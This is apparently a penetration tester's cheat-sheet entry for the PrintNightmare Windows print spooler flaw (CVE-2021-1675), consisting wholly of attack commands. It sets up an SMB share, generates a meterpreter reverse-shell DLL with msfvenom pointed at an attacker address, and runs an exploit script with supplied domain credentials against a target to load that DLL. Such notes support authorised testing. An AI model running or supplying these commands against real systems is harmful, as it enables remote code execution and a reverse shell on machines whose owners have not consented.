###  PrintNightmare 

```
python3 smbserver.py -smb2support share /root/share/
Generate a dll file using either metasploit or cobalt strike
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.100.105 LPORT=7777 -f dll > shell.dll
python3 CVE-2021-1675.py elastic.me/john:123456789aA@172.16.100.10 '\\172.16.100.105\share\shell.dll'  
python3 CVE-2021-1675.py elastic.me/john:123456789aA@172.16.100.10 'C:\Users\Public\shell.dll'
```
